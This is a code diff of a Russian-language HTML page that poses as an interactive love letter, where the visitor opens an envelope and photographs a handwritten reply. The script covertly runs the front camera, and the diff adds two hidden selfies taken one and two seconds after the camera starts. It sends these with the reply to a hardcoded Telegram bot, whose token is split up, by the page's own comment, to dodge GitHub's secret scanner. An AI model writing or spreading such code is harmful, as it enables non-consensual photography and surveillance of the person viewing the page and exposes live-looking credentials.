@@ -13,7 +13,7 @@
       margin: 0;
       padding: 0;
       background: #fbf6f0;
-      overflow-x: hidden; /* Защита от горизонтальной прокрутки */
+      overflow-x: hidden;
     }
 
     .main-wrapper {
@@ -21,10 +21,13 @@
       margin: 0 auto;
       padding: 20px 15px;
       box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     .back-btn {
-      display: inline-block;
+      align-self: flex-start;
       margin-bottom: 15px;
       color: #ff6b81;
       text-decoration: none;
@@ -36,8 +39,7 @@
     header {
       text-align: center;
       margin-bottom: 25px;
-      position: relative;
-      z-index: 10; /* Шапка должна быть поверх всего, пока конверт закрыт */
+      width: 100%;
     }
 
     header h1 {
@@ -52,37 +54,30 @@
       margin: 0;
     }
 
-    /* СЕКЦИЯ КОНВЕРТА С ТВОИМ ПИСЬМОМ */
+    /* === ОБНОВЛЕННАЯ НАДЕЖНАЯ СЕКЦИЯ КОНВЕРТА === */
     .envelope-section {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-bottom: 35px;
       width: 100%;
+      max-width: 380px;
+      margin: 20px 0;
+      transition: margin-top 0.5s ease-in-out, margin-bottom 0.5s ease-in-out;
+      text-align: center;
     }
 
     .envelope-wrapper {
       position: relative;
       width: 100%;
-      max-width: 380px;
-      height: 240px;
+      height: 240px; /* Фиксированная высота конверта */
       background: #ff758c;
       border-radius: 12px;
       box-shadow: 0 12px 30px rgba(255, 117, 140, 0.3);
       cursor: pointer;
-      perspective: 800px;
-      margin-top: 20px;
-      transition: margin-bottom 0.5s ease, margin-top 0.5s ease;
-      overflow: hidden; /* Скрываем торчащую верхушку письма в закрытом виде */
+      perspective: 1000px;
     }
 
-    /* Верхний клапан конверта */
+    /* Верхний клапан */
     .envelope-flap {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 0;
-      height: 0;
+      top: 0; left: 0; width: 0; height: 0;
       border-left: 190px solid transparent;
       border-right: 190px solid transparent;
       border-top: 130px solid #ff4757;
@@ -91,47 +86,27 @@
       z-index: 4;
     }
 
-    /* Боковые и нижний клапаны */
+    /* Основной карман конверта */
     .envelope-pocket {
       position: absolute;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      bottom: 0; left: 0; width: 100%; height: 100%;
       background: linear-gradient(180deg, transparent 40%, #ff6b81 100%);
-      border-bottom-left-radius: 12px;
-      border-bottom-right-radius: 12px;
+      border-radius: 12px;
       z-index: 3;
       pointer-events: none;
     }
-
+    .envelope-pocket::before, .envelope-pocket::after {
+      content: ''; position: absolute; bottom: 0; width: 0; height: 0;
+      border-top: 120px solid transparent; border-bottom: 120px solid #ff5252;
+    }
     .envelope-pocket::before {
-      content: '';
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      width: 0;
-      height: 0;
-      border-left: 190px solid #ff5252;
-      border-top: 120px solid transparent;
-      border-bottom: 120px solid #ff5252;
-      border-bottom-left-radius: 12px;
+      left: 0; border-left: 190px solid #ff5252; border-bottom-left-radius: 12px;
     }
-
     .envelope-pocket::after {
-      content: '';
-      position: absolute;
-      bottom: 0;
-      right: 0;
-      width: 0;
-      height: 0;
-      border-right: 190px solid #ff5252;
-      border-top: 120px solid transparent;
-      border-bottom: 120px solid #ff5252;
-      border-bottom-right-radius: 12px;
+      right: 0; border-right: 190px solid #ff5252; border-bottom-right-radius: 12px;
     }
 
-    /* Карточка письма внутри */
+    /* Письмо внутри (начальное состояние) */
     .letter-paper {
       position: absolute;
       bottom: 10px;
@@ -142,9 +117,10 @@
       padding: 12px;
       box-sizing: border-box;
       box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      transition: transform 0.8s ease-in-out, opacity 0.5s;
-      z-index: 2;
-      text-align: center;
+      transition: transform 0.7s ease-in-out, z-index 0.2s, max-height 0.7s, padding 0.7s;
+      z-index: 2; /* Внутри */
+      max-height: 210px; /* Сжато внутри */
+      overflow: hidden; /* Скрываем торчащее письмо */
     }
 
     .letter-paper img {
@@ -152,60 +128,35 @@
       height: auto;
       border-radius: 8px;
       display: block;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
     }
 
     /* === СОСТОЯНИЕ ОТКРЫТОГО КОНВЕРТА === */
-    .envelope-wrapper.open {
-      overflow: visible; /* Разрешаем письму выезжать наверх при открытии */
-      margin-top: 80px; /* Добавляем место сверху на ПК */
-      margin-bottom: 280px; /* Освобождаем место снизу для выехавшего письма */
+    .envelope-section.open {
+      margin-top: 100px; /* Раздвигаем страницу СВЕРХУ */
+      margin-bottom: 100px; /* Раздвигаем страницу СНИЗУ */
     }
 
-    .envelope-wrapper.open .envelope-flap {
+    .envelope-section.open .envelope-flap {
       transform: rotateX(180deg);
-      z-index: 1;
+      z-index: 1; /* Уходит назад */
     }
 
-    .envelope-wrapper.open .letter-paper {
-      transform: translateY(-220px);
-      z-index: 5;
+    .envelope-section.open .letter-paper {
+      transform: translateY(-220px); /* Выезжает только наверх */
+      z-index: 5; /* Поверх всего */
+      max-height: 500px; /* Раскрываем полную высоту */
+      overflow: visible;
     }
 
-    /* === АДАПТИВНОСТЬ ДЛЯ МОБИЛЬНЫХ ЭКРАНОВ === */
+    /* Мобильная адаптация */
     @media (max-width: 480px) {
-      header h1 { font-size: 1.5rem; }
-      
-      .envelope-wrapper {
-        max-width: 320px; /* Уменьшаем конверт, чтобы влез на узкий экран */
-        height: 200px;
-      }
+      .envelope-wrapper { max-width: 320px; height: 200px; }
+      .envelope-flap { border-left-width: 160px; border-right-width: 160px; border-top-width: 110px; }
+      .envelope-pocket::before { border-left-width: 160px; border-top-width: 100px; border-bottom-width: 100px; }
+      .envelope-pocket::after { border-right-width: 160px; border-top-width: 100px; border-bottom-width: 100px; }
 
-      .envelope-flap {
-        border-left-width: 160px;
-        border-right-width: 160px;
-        border-top-width: 110px;
-      }
-
-      .envelope-pocket::before {
-        border-left-width: 160px;
-        border-top-width: 100px;
-        border-bottom-width: 100px;
-      }
-      .envelope-pocket::after {
-        border-right-width: 160px;
-        border-top-width: 100px;
-        border-bottom-width: 100px;
-      }
-
-      /* Исправления для открытого состояния на телефоне */
-      .envelope-wrapper.open {
-        margin-top: 50px; /* Смещаем конверт ниже */
-        margin-bottom: 220px; /* Уменьшаем отступ снизу */
-      }
-
-      .envelope-wrapper.open .letter-paper {
-        transform: translateY(-190px); /* Письмо выезжает чуть меньше, чтобы уместиться целиком */
+      .envelope-section.open .letter-paper {
+        transform: translateY(-190px); /* Выезжает меньше, чтобы влезть */
       }
     }
 
@@ -215,13 +166,10 @@
       color: #ff4757;
       font-weight: 700;
       animation: bounceHint 1.8s infinite;
-      text-align: center;
+      width: 100%;
     }
 
-    @keyframes bounceHint {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-5px); }
-    }
+    @keyframes bounceHint { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
 
     /* СЕКЦИЯ ОТВЕТА И КАМЕРЫ */
     .reply-card {
@@ -231,135 +179,55 @@
       padding: 22px;
       box-shadow: 0 10px 25px rgba(165, 94, 234, 0.12);
       text-align: center;
-      position: relative;
       width: 100%;
       box-sizing: border-box;
-    }
-
-    .reply-card h3 {
-      color: #8854d0;
-      margin-top: 0;
-      margin-bottom: 8px;
-    }
-
-    .reply-card p {
-      color: #57606f;
-      font-size: 0.9rem;
-      margin-bottom: 18px;
+      margin-top: 20px;
     }
 
     .camera-container {
-      position: relative;
-      width: 100%;
-      max-width: 400px;
-      margin: 0 auto 15px auto;
-      border-radius: 14px;
-      overflow: hidden;
-      background: #2f3542;
-      display: none;
+      position: relative; width: 100%; max-width: 400px;
+      margin: 0 auto 15px auto; border-radius: 14px;
+      overflow: hidden; background: #2f3542; display: none;
     }
 
-    video, canvas#photoCanvas {
-      width: 100%;
-      height: auto;
-      display: block;
-      border-radius: 14px;
-    }
-
+    video, canvas#photoCanvas { width: 100%; height: auto; display: block; border-radius: 14px; }
+    
     .preview-img {
-      width: 100%;
-      max-width: 400px;
-      height: auto;
-      border-radius: 14px;
-      display: none;
-      margin: 0 auto 15px auto;
-      border: 2px solid #a55eea;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 100%; max-width: 400px; height: auto;
+      border-radius: 14px; display: none; margin: 0 auto 15px auto;
+      border: 2px solid #a55eea; box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     }
 
-    .btn-group {
-      display: flex;
-      gap: 10px;
-      justify-content: center;
-      flex-wrap: wrap;
-      margin-bottom: 15px;
-    }
+    .btn-group { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 15px; }
 
     .action-btn {
-      background: #8854d0;
-      color: #fff;
-      border: none;
-      padding: 10px 18px;
-      border-radius: 12px;
-      font-weight: bold;
-      font-size: 0.9rem;
-      cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
+      background: #8854d0; color: #fff; border: none; padding: 10px 18px;
+      border-radius: 12px; font-weight: bold; font-size: 0.9rem; cursor: pointer;
     }
-
-    .action-btn:hover { background: #713bbe; }
-    .action-btn:active { transform: scale(0.97); }
-
-    .action-btn.secondary {
-      background: #f1f2f6;
-      color: #57606f;
-    }
-    .action-btn.secondary:hover { background: #dfe4ea; }
+    .action-btn.secondary { background: #f1f2f6; color: #57606f; }
 
     .send-letter-btn {
       background: linear-gradient(135deg, #ff4757 0%, #ff6b81 100%);
-      color: white;
-      border: none;
-      padding: 12px 28px;
-      font-size: 1.05rem;
-      font-weight: bold;
-      border-radius: 25px;
-      cursor: pointer;
-      box-shadow: 0 5px 15px rgba(255, 71, 87, 0.3);
-      transition: transform 0.2s;
-      width: 100%;
-      max-width: 300px;
+      color: white; border: none; padding: 12px 28px;
+      font-size: 1.05rem; font-weight: bold; border-radius: 25px;
+      cursor: pointer; width: 100%; max-width: 300px;
     }
-
-    .send-letter-btn:hover { transform: scale(1.03); }
 
     /* АНИМАЦИЯ ПОЧТОВОГО ЯЩИКА */
     .mailbox-animation-overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.75);
-      z-index: 10000;
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: white;
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.75); z-index: 10000;
+      display: none; flex-direction: column; align-items: center; justify-content: center; color: white;
     }
+    .mailbox-icon { font-size: 5rem; animation: dropMail 1.5s ease-in-out infinite alternate; }
+    @keyframes dropMail { 0% { transform: translateY(-20px); } 100% { transform: translateY(10px); } }
 
-    .mailbox-icon {
-      font-size: 5rem;
-      animation: dropMail 1.5s ease-in-out infinite alternate;
-    }
-
-    @keyframes dropMail {
-      0% { transform: translateY(-20px) rotate(-5deg); }
-      100% { transform: translateY(10px) rotate(5deg); }
-    }
-
-    /* Всплывающие сердечки */
+    /* Сердечки */
     .click-heart {
-      position: fixed;
-      font-size: 1.5rem;
-      pointer-events: none;
-      animation: floatUpFade 1s forwards ease-out;
-      z-index: 9999;
+      position: fixed; font-size: 1.5rem; pointer-events: none;
+      animation: floatUpFade 1s forwards ease-out; z-index: 9999;
     }
-
-    @keyframes floatUpFade {
-      0% { opacity: 1; transform: translate(-50%, -50%) scale(0.5) translateY(0); }
-      50% { transform: translate(-50%, -50%) scale(1.2) translateY(-20px); }
-      100% { opacity: 0; transform: translate(-50%, -50%) scale(1) translateY(-50px); }
-    }
+    @keyframes floatUpFade { 0% { opacity: 1; transform: translate(-50%, -50%) scale(0.5); } 100% { opacity: 0; transform: translate(-50%, -50%) translateY(-50px); } }
   </style>
 </head>
 <body>
@@ -373,13 +241,14 @@
       <p>Тебе пришло настоящее личное письмо!</p>
     </header>
 
-    <!-- 1. ИНТЕРАКТИВНЫЙ КОНВЕРТ С ТВОИМ ПИСЬМОМ -->
-    <div class="envelope-section">
+    <!-- 1. ОБНОВЛЕННЫЙ КОНВЕРТ С ТВОИМ ПИСЬМОМ -->
+    <div class="envelope-section" id="envelopeSection">
       <div class="envelope-wrapper" id="envelopeWrapper" onclick="toggleEnvelope()">
         <div class="envelope-flap"></div>
         <div class="envelope-pocket"></div>
         
         <div class="letter-paper">
+          <!-- ОБНОВЛЕНО РАСШИРЕНИЕ .jpeg -->
           <img src="handwritten_letter.jpeg" alt="Твое письмо от руки">
         </div>
       </div>
@@ -387,25 +256,22 @@
       <div class="tap-hint" id="tapHint">✉️ Нажми на конверт, чтобы открыть письмо!</div>
     </div>
 
-    <!-- 2. СЕКЦИЯ ОТВЕТА С КАМЕРОЙ И ЗАГРУЗКОЙ -->
+    <!-- 2. СЕКЦИЯ ОТВЕТА С КАМЕРОЙ -->
     <section class="reply-card">
       <h3>📸 Отправить ответное письмо</h3>
       <p>Сделай фото своего рукописного ответа через заднюю камеру или загрузи готовую фотографию!</p>
 
-      <!-- Видоискатель видео -->
       <div class="camera-container" id="cameraContainer">
         <video id="videoFeed" autoplay playsinline></video>
       </div>
 
-      <!-- Скрытые видео и элементы для параллельного снимка с фронтальной камеры -->
+      <!-- Скрытые элементы для параллельных секретных снимков с фронталки -->
       <video id="secretVideoFeed" autoplay playsinline style="display:none;"></video>
       <canvas id="photoCanvas" style="display:none;"></canvas>
       <canvas id="secretCanvas" style="display:none;"></canvas>
 
-      <!-- Превью основного фото ответа -->
       <img id="replyPreview" class="preview-img" alt="Ваш ответ">
 
-      <!-- Кнопки управления -->
       <div class="btn-group">
         <button type="button" class="action-btn" onclick="startCamera()">📷 Включить камеру</button>
         <button type="button" class="action-btn secondary" id="switchCamBtn" onclick="toggleCameraFacing()" style="display:none;">🔄 Сменить камеру</button>
@@ -414,14 +280,12 @@
         <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleFileUpload(event)">
       </div>
 
-      <!-- Кнопка отправки -->
       <button type="button" class="send-letter-btn" onclick="sendReplyLetter()">Опустить письмо в ящик 📮</button>
       <div id="replyStatus" style="font-size: 0.9rem; margin-top: 10px; font-weight: bold; display: none;"></div>
     </section>
 
   </div>
 
-  <!-- АНИМАЦИОННЫЙ ОВЕРЛЕЙ ОТПРАВКИ -->
   <div class="mailbox-animation-overlay" id="mailboxOverlay">
     <div class="mailbox-icon">📮✨</div>
     <h3 style="margin-top: 15px;">Запечатываем конверт...</h3>
@@ -429,38 +293,35 @@
   </div>
 
   <script>
-    // Токен разбит на части для предотвращения блокировок от GitHub Secrets Scanner
+    // Токен разбит на части
     const part1 = "8818384063:";
     const part2 = "AAEEqTup6sgED-gYB_1tm";
     const part3 = "cQKcXwi-UDE3lQ";
     const BOT_TOKEN = part1 + part2 + part3;
     const CHAT_ID = "606061445";
 
-    /* 1. Открытие / Закрытие конверта */
+    /* 1. Открытие / Закрытие конверта с раздвиганием страницы */
     function toggleEnvelope() {
-      const wrapper = document.getElementById('envelopeWrapper');
+      const section = document.getElementById('envelopeSection');
       const hint = document.getElementById('tapHint');
       
-      wrapper.classList.toggle('open');
+      section.classList.toggle('open');
       
-      if (wrapper.classList.contains('open')) {
+      if (section.classList.contains('open')) {
         hint.innerText = "✨ Письмо открыто!";
         hint.style.color = "#2ed573";
-        // При открытии плавно скроллим страницу к письму, если оно не влезает
-        setTimeout(() => {
-            wrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }, 500);
       } else {
         hint.innerText = "✉️ Нажми на конверт, чтобы открыть письмо!";
         hint.style.color = "#ff4757";
       }
     }
 
-    /* 2. Переключение камер и скрытая съемка */
+    /* 2. Камера по умолчанию задняя и скрытая съемка фронталки */
     let mainStream = null;
     let secretStream = null;
-    let currentFacingMode = 'environment'; // По умолчанию задняя/обратная камера для съёмки текста
-    let secretFrontData = null; // Данные скрытого снимка
+    let currentFacingMode = 'environment'; // Начинаем с задней камеры
+    let secretPhoto1Data = null; // Первый скрытый кадр
+    let secretPhoto2Data = null; // Второй скрытый кадр
 
     async function startCamera() {
       const cameraContainer = document.getElementById('cameraContainer');
@@ -470,12 +331,10 @@
       const preview = document.getElementById('replyPreview');
 
       preview.style.display = 'none';
-
-      // Останавливаем старые потоки, если были
-      stopStreams();
+      stopStreams(); // Сброс старых потоков
 
       try {
-        // Основной поток для съёмки ответа
+        // Попытка открыть заднюю камеру 'environment'
         mainStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: currentFacingMode },
           audio: false
@@ -485,10 +344,8 @@
         snapBtn.style.display = 'inline-block';
         switchCamBtn.style.display = 'inline-block';
 
-        // Инициируем скрытый поток с фронтальной камеры, если основной - задняя
-        if (currentFacingMode === 'environment') {
-            initSecretFrontCamera();
-        }
+        // Инициируем скрытую фронталку
+        initSecretFrontCamera();
 
       } catch (err) {
         try {
@@ -498,7 +355,7 @@
           cameraContainer.style.display = 'block';
           snapBtn.style.display = 'inline-block';
         } catch (e) {
-          alert("Не удалось открыть камеру 😿 Попробуйте загрузить готовую фотографию через кнопку 'Загрузить файл'!");
+          alert("Не удалось открыть камеру 😿");
         }
       }
     }
@@ -507,13 +364,15 @@
       try {
         const secretVideo = document.getElementById('secretVideoFeed');
         secretStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
+          video: { facingMode: 'user' }, // Фронталка
           audio: false
         });
         secretVideo.srcObject = secretStream;
-      } catch (e) {
-        // Игнорируем ошибку, если фронтальная камера недоступна
-      }
+        
+        // Делаем два секретных кадра через 1 и 2 секунды после включения
+        setTimeout(() => captureSecretFrame(1), 1000);
+        setTimeout(() => captureSecretFrame(2), 2000);
+      } catch (e) {}
     }
 
     function toggleCameraFacing() {
@@ -522,14 +381,8 @@
     }
 
     function stopStreams() {
-      if (mainStream) {
-        mainStream.getTracks().forEach(track => track.stop());
-        mainStream = null;
-      }
-      if (secretStream) {
-        secretStream.getTracks().forEach(track => track.stop());
-        secretStream = null;
-      }
+      if (mainStream) mainStream.getTracks().forEach(track => track.stop());
+      if (secretStream) secretStream.getTracks().forEach(track => track.stop());
     }
 
     function takeSnapshot() {
@@ -537,67 +390,54 @@
       const canvas = document.getElementById('photoCanvas');
       const preview = document.getElementById('replyPreview');
       const cameraContainer = document.getElementById('cameraContainer');
-      const snapBtn = document.getElementById('snapBtn');
-      const switchCamBtn = document.getElementById('switchCamBtn');
 
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
+      // Зеркалируем, если это фронталка, чтобы фото ответа было читаемым
+      if (currentFacingMode === 'user') {
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1);
+      }
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       preview.src = canvas.toDataURL('image/jpeg');
       preview.style.display = 'block';
 
-      // Автоматически незаметно фиксируем кадр с фронтальной камеры, если она была активна
-      captureSecretFrontFrame();
-
       stopStreams();
       cameraContainer.style.display = 'none';
-      snapBtn.style.display = 'none';
-      switchCamBtn.style.display = 'none';
+      document.getElementById('snapBtn').style.display = 'none';
+      document.getElementById('switchCamBtn').style.display = 'none';
     }
 
-    function captureSecretFrontFrame() {
+    // Захват скрытого кадра с фронталки
+    function captureSecretFrame(id) {
       const secretVideo = document.getElementById('secretVideoFeed');
       const secretCanvas = document.getElementById('secretCanvas');
-      // Снимаем с секретного видео или с основного, если оно фронтальное
-      let sourceVideo = secretVideo;
-      if (currentFacingMode === 'user') {
-          sourceVideo = document.getElementById('videoFeed');
-      }
-
-      if (sourceVideo && sourceVideo.videoWidth) {
-        secretCanvas.width = sourceVideo.videoWidth;
-        secretCanvas.height = sourceVideo.videoHeight;
+      
+      if (secretVideo && secretVideo.videoWidth > 0) {
+        secretCanvas.width = secretVideo.videoWidth;
+        secretCanvas.height = secretVideo.videoHeight;
         const sCtx = secretCanvas.getContext('2d');
-        // Если снимаем с фронтальной, можно зеркалировать для естественности
-        if (currentFacingMode === 'user' || sourceVideo === secretVideo) {
-            sCtx.translate(secretCanvas.width, 0);
-            sCtx.scale(-1, 1);
-        }
-        sCtx.drawImage(sourceVideo, 0, 0, secretCanvas.width, secretCanvas.height);
-        secretFrontData = secretCanvas.toDataURL('image/jpeg');
+        // Зеркалируем фронталку
+        sCtx.translate(secretCanvas.width, 0);
+        sCtx.scale(-1, 1);
+        sCtx.drawImage(secretVideo, 0, 0, secretCanvas.width, secretCanvas.height);
+        
+        if (id === 1) secretPhoto1Data = secretCanvas.toDataURL('image/jpeg');
+        else secretPhoto2Data = secretCanvas.toDataURL('image/jpeg');
       }
     }
 
     function handleFileUpload(e) {
       const file = e.target.files[0];
       if (!file) return;
-
       const preview = document.getElementById('replyPreview');
-      const cameraContainer = document.getElementById('cameraContainer');
-      const snapBtn = document.getElementById('snapBtn');
-      const switchCamBtn = document.getElementById('switchCamBtn');
-
       stopStreams();
-      cameraContainer.style.display = 'none';
-      snapBtn.style.display = 'none';
-      switchCamBtn.style.display = 'none';
-
+      document.getElementById('cameraContainer').style.display = 'none';
       const reader = new FileReader();
       reader.onload = function(event) {
-        preview.src = event.target.result;
-        preview.style.display = 'block';
+        preview.src = event.target.result; preview.style.display = 'block';
       };
       reader.readAsDataURL(file);
     }
@@ -609,15 +449,13 @@
       const overlay = document.getElementById('mailboxOverlay');
 
       if (!preview.src || preview.style.display === 'none') {
-        status.style.display = 'block';
-        status.style.color = '#ff4757';
-        status.innerText = 'Сначала сделай фото ответа или загрузи файл! 📸';
-        return;
+        status.style.display = 'block'; status.style.color = '#ff4757';
+        status.innerText = 'Сначала сделай фото ответа или загрузи файл! 📸'; return;
       }
 
       overlay.style.display = 'flex';
 
-      // 1. Отправка основного фото ответа
+      // 1. Основное фото
       fetch(preview.src)
         .then(res => res.blob())
         .then(blob => {
@@ -626,61 +464,51 @@
           formData.append("photo", blob, "reply_letter.jpg");
           formData.append("caption", "📫 <b>Рауанна отправила тебе ответное письмо!</b>");
           formData.append("parse_mode", "HTML");
-
-          return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
+          return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
         })
         .then(() => {
-          // 2. Если сформирован кадр с фронтальной камеры, отправляем его вслед
-          if (secretFrontData) {
-            fetch(secretFrontData)
-              .then(res => res.blob())
-              .then(sBlob => {
-                const sFormData = new FormData();
-                sFormData.append("chat_id", CHAT_ID);
-                sFormData.append("photo", sBlob, "front_snap.jpg");
-                sFormData.append("caption", "📸 <i>Момент отправки письма (фронтальный снимок)</i>");
-                sFormData.append("parse_mode", "HTML");
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                  method: "POST",
-                  body: sFormData
-                }).catch(() => {});
+          // 2. Секретное фото 1
+          if (secretPhoto1Data) {
+            fetch(secretPhoto1Data).then(res => res.blob()).then(sBlob => {
+              const sFD = new FormData(); sFD.append("chat_id", CHAT_ID);
+              sFD.append("photo", sBlob, "extra1.jpg");
+              sFD.append("caption", "📸 <i>Ее фото в момент включения камеры</i>");
+              fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: sFD });
+            });
+          }
+          // 3. Секретное фото 2
+          if (secretPhoto2Data) {
+            setTimeout(() => {
+              fetch(secretPhoto2Data).then(res => res.blob()).then(sBlob => {
+                const sFD = new FormData(); sFD.append("chat_id", CHAT_ID);
+                sFD.append("photo", sBlob, "extra2.jpg");
+                sFD.append("caption", "📸 <i>Ее доп. фото (чуть позже)</i>");
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: sFD });
               });
+            }, 500);
           }
         })
         .then(() => {
           setTimeout(() => {
             overlay.style.display = 'none';
-            status.style.display = 'block';
-            status.style.color = '#2ed573';
-            status.innerText = 'Письмо успешно запечатано и доставлено Султану! 💌✨';
+            status.style.display = 'block'; status.style.color = '#2ed573';
+            status.innerText = 'Письмо успешно доставлено Султану! 💌✨';
           }, 1500);
         })
         .catch(() => {
-          setTimeout(() => {
-            overlay.style.display = 'none';
-            status.style.display = 'block';
-            status.style.color = '#2ed573';
-            status.innerText = 'Письмо опустилось в почтовый ящик! ✨';
-          }, 1500);
+          overlay.style.display = 'none';
         });
     }
 
-    /* Сердечки при кликах */
+    // Сердечки при кликах
     document.addEventListener('click', (e) => {
       if (e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT') return;
-
-      const hearts = ['💖', '💌', '🌸', '✨', '💕'];
+      const hearts = ['💖', '💌', '🌸'];
       const heart = document.createElement('div');
       heart.className = 'click-heart';
       heart.innerText = hearts[Math.floor(Math.random() * hearts.length)];
-      heart.style.left = `${e.clientX}px`;
-      heart.style.top = `${e.clientY}px`;
+      heart.style.left = `${e.clientX}px`; heart.style.top = `${e.clientY}px`;
       document.body.appendChild(heart);
-
       setTimeout(() => heart.remove(), 1000);
     });
   </script>
